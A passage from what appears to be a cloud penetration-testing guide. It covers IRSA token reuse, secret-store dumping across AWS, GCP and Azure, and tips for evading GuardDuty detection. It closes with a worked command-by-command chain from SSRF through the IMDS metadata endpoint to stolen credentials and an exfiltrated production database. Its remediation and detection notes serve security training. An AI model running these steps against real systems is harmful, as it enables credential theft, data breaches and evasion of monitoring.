Pods running under IRSA (IAM Roles for Service Accounts) have a projected JWT at /var/run/secrets/eks.amazonaws.com/serviceaccount/token. Any container break-out reads it and calls aws sts assume-role-with-web-identity from anywhere:
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" \
  --role-session-name pivot \
  --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE
14. Cloud Secrets Services

Every provider ships a managed secret store. If you have a role that reads them, you have every secret.
14.1 AWS Secrets Manager and Parameter Store
# List and read every secret in the account:
aws secretsmanager list-secrets --profile loot | jq '.SecretList[].Name'
aws secretsmanager get-secret-value --secret-id prod/db/master --profile loot
# {
#   "SecretString": "{\"username\":\"admin\",\"password\":\"...\"}"
# }

# Parameter Store — SSM:
aws ssm describe-parameters --profile loot
aws ssm get-parameters-by-path --path / --recursive --with-decryption --profile loot

Parameter Store is often more permissive than Secrets Manager because it started as a config store and became a secret store by convention.
14.2 GCP Secret Manager
gcloud secrets list --project client-prod-01
gcloud secrets versions access latest --secret=db-password --project client-prod-01
14.3 Azure Key Vault
# List vaults:
az keyvault list -o table

# List and read secrets in a vault:
az keyvault secret list --vault-name prod-kv -o table
az keyvault secret show --vault-name prod-kv --name db-connection-string

Vault access is controlled either by legacy access policies or by Azure RBAC on the vault. The Key Vault Administrator role is the ownership-equivalent. Key Vault Secrets User grants just read.
15. Logging and Detection

Everything you type generates log lines. Assume every API call is captured; plan your enumeration around that assumption.
15.1 The Log Surfaces
Provider	Control-plane Audit	Data-plane Access	Network
AWS	CloudTrail (management + data events)	S3 Access Logs, CloudTrail data events	VPC Flow Logs
GCP	Cloud Audit Logs (Admin Activity + Data Access)	GCS access logs	VPC Flow Logs
Azure	Activity Log + Entra ID Sign-in Logs	Storage diagnostic logs	NSG Flow Logs

Detection systems layered on top:

    AWS: GuardDuty (anomaly detection), Detective (graph investigations), Security Hub (aggregation).
    GCP: Security Command Center, Event Threat Detection.
    Azure: Microsoft Defender for Cloud, Microsoft Sentinel (SIEM).

15.2 What Your Enumeration Looks Like on the Blue Side

aws sts get-caller-identity is unmonitored on many accounts because it is a benign identity check. aws iam list-* calls are individually low-signal, but 400 of them in a minute from a single principal light up any properly tuned SIEM.

Rules of thumb for a stealthier engagement:

    Prefer read-only enumeration against services the target actually uses; a describe-cluster on an unused ECS cluster stands out more than one on the active production cluster.
    Space enumeration out over minutes, not seconds. GuardDuty's Recon:IAMUser/UserPermissions finding requires burst volume.
    Enumerate from an IP the target uses. A short-lived EC2 instance in the account is invisible to MaliciousIPCaller findings.
    Avoid sts:GetSessionToken from a Kali IP with a personal-looking user-agent — CloudTrail records both.

You will still be caught by a mature program. The goal is not invisibility — it is not being the loudest attacker in the account.
16. End-to-End Example — SSRF to Data Breach

A single realistic chain, from an unauthenticated web request to a plaintext database credential dump.
16.1 Target and Setup

The target is a Node.js web app that fetches a preview thumbnail from a URL supplied by the user. The POST /preview endpoint accepts a JSON body { "url": "..." } and returns the fetched bytes. The application runs on EC2 with HttpTokens: optional — IMDSv1 is enabled.
16.2 Stage 1 — Confirm SSRF and Reach IMDS
curl -s -X POST https://app.client.com/preview \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# backup-writer-role

The endpoint returns the name of the role attached to the instance. IMDSv1 confirmed.
16.3 Stage 2 — Extract Credentials
curl -s -X POST https://app.client.com/preview \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-writer-role"}'
# {
#   "Code":"Success",
#   "AccessKeyId":"ASIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey":"wJalr...",
#   "Token":"IQoJb3JpZ2luX2VjE...",
#   "Expiration":"2026-09-04T18:22:00Z"
# }

Export them locally:
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalr...
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE...
16.4 Stage 3 — Identify the Role
aws sts get-caller-identity
# {
#   "UserId": "AROA...:i-0abcdef1234567890",
#   "Account": "123456789012",
#   "Arn": "arn:aws:sts::123456789012:assumed-role/backup-writer-role/i-0abcdef1234567890"
# }

Confirmed: we hold the backup-writer-role in account 123456789012.
16.5 Stage 4 — Enumerate Reachable Buckets
aws s3 ls
# 2024-03-11 client-prod-assets
# 2024-06-02 client-prod-uploads
# 2025-01-14 client-prod-db-backups
# 2025-07-22 client-prod-logs

aws s3 ls s3://client-prod-db-backups/
#     PRE 2026/
#     PRE 2025/
aws s3 ls s3://client-prod-db-backups/2026/09/ --recursive
# 2026-09-04 03:00:12  8938291744  2026/09/04/prod-master.sql.gz
16.6 Stage 5 — Download and Search
aws s3 cp s3://client-prod-db-backups/2026/09/04/prod-master.sql.gz /loot/
gunzip /loot/prod-master.sql.gz

# Look for creds embedded in the dump:
grep -aEi 'password|token|api[_-]?key' /loot/prod-master.sql | head
# users: {'email': 'admin@client.io', 'password_hash': '...', ...}
# integrations: {'stripe_api_key': 'sk_live_...', ...}
# integrations: {'sendgrid_api_key': 'SG.xxx...', ...}

The chain — a two-line SSRF in a preview endpoint — has produced a full production database, a Stripe secret key, and email-service credentials. The remediation is: enforce IMDSv2, restrict the SSRF, tighten the role, and encrypt backups with a customer-managed KMS key that the role cannot decrypt.
16.7 What This Looked Like in CloudTrail

Each call above appears in CloudTrail with sourceIPAddress set to the Kali box IP (except the IMDS reads, which are not CloudTrail events). GuardDuty fires UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS on the first aws s3 ls call from outside AWS. Running the enumeration from an EC2 in the same account avoids that specific finding.
17. Exercises
17.1 Guided Exercises
